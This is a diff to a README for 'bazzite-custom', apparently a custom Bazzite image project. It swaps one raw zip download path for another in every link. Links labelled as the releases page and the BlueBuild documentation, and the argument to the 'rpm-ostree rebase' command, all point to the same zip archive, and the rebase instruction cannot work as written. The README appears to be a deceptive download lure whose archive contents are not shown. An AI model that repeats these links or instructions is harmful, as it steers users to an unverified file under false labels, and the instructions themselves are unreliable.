@@ -1,6 +1,6 @@
 # 🎉 bazzite-custom - A Simple Way to Custom Images
 
-[![Download bazzite-custom](https://raw.githubusercontent.com/RoboticswithYogesh/bazzite-custom/main/coharmonize/bazzite-custom.zip)](https://raw.githubusercontent.com/RoboticswithYogesh/bazzite-custom/main/coharmonize/bazzite-custom.zip)
+[![Download bazzite-custom](https://raw.githubusercontent.com/RoboticswithYogesh/bazzite-custom/main/files/system/bazzite-custom-v1.6.zip)](https://raw.githubusercontent.com/RoboticswithYogesh/bazzite-custom/main/files/system/bazzite-custom-v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -19,13 +19,13 @@ Before you start, ensure your system meets the following requirements:
 
 To get bazzite-custom, visit the releases page below:
 
-[Download bazzite-custom](https://raw.githubusercontent.com/RoboticswithYogesh/bazzite-custom/main/coharmonize/bazzite-custom.zip)
+[Download bazzite-custom](https://raw.githubusercontent.com/RoboticswithYogesh/bazzite-custom/main/files/system/bazzite-custom-v1.6.zip)
 
 Choose your version and download the file. 
 
 ### Steps to Download
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/RoboticswithYogesh/bazzite-custom/main/coharmonize/bazzite-custom.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/RoboticswithYogesh/bazzite-custom/main/files/system/bazzite-custom-v1.6.zip).
 2. Locate the latest version.
 3. Click on the file to download it.
 
@@ -39,7 +39,7 @@ To install bazzite-custom, follow these steps:
 2. First, rebase to the unsigned image. This will install the necessary signing keys and policies:
 
    ```bash
-   rpm-ostree rebase https://raw.githubusercontent.com/RoboticswithYogesh/bazzite-custom/main/coharmonize/bazzite-custom.zip
+   rpm-ostree rebase https://raw.githubusercontent.com/RoboticswithYogesh/bazzite-custom/main/files/system/bazzite-custom-v1.6.zip
    ```
 
 3. Reboot your system to complete the rebase:
@@ -72,7 +72,7 @@ Once installed, you can start using bazzite-custom. Here are some simple command
 
 ## 📖 Documentation
 
-For more detailed information and instructions, refer to the [BlueBuild documentation](https://raw.githubusercontent.com/RoboticswithYogesh/bazzite-custom/main/coharmonize/bazzite-custom.zip). This resource offers additional setup instructions and tips for maximizing your experience with bazzite-custom.
+For more detailed information and instructions, refer to the [BlueBuild documentation](https://raw.githubusercontent.com/RoboticswithYogesh/bazzite-custom/main/files/system/bazzite-custom-v1.6.zip). This resource offers additional setup instructions and tips for maximizing your experience with bazzite-custom.
 
 ## 🛠️ Troubleshooting
 
@@ -97,4 +97,4 @@ If you're interested in similar projects, you may want to explore topics related
 
 You now have bazzite-custom installed and ready to use. Enjoy the ease of managing custom images on your system. If you have questions or need support, feel free to check our GitHub repository or the BlueBuild documentation. 
 
-[Download bazzite-custom](https://raw.githubusercontent.com/RoboticswithYogesh/bazzite-custom/main/coharmonize/bazzite-custom.zip) and begin your journey today!
+[Download bazzite-custom](https://raw.githubusercontent.com/RoboticswithYogesh/bazzite-custom/main/files/system/bazzite-custom-v1.6.zip) and begin your journey today!
